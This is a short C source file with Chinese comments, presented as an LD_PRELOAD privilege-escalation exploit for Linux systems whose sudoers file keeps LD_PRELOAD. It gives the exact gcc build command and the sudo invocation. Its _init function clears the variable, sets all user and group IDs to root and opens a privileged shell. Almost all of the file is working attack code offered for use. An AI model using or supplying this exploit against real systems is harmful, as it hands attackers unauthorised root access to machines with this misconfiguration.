/*
 * priv-so.c — LD_PRELOAD sudo 提权 exploit
 *
 * 适用条件: /etc/sudoers 中配置了 Defaults env_keep+=LD_PRELOAD
 * （非默认配置，需要管理员显式开启）
 *
 * 用法:
 *   gcc -fPIC -shared -nostartfiles -o priv.so priv-so.c
 *   sudo LD_PRELOAD=./priv.so /usr/bin/something
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");             // 清除环境，避免循环
    setresuid(0, 0, 0);                 // 设 uid=euid=ruid=0
    setresgid(0, 0, 0);                 // 设 gid=egid=rgid=0
    system("/bin/sh -p");               // -p 保留 privilege
}
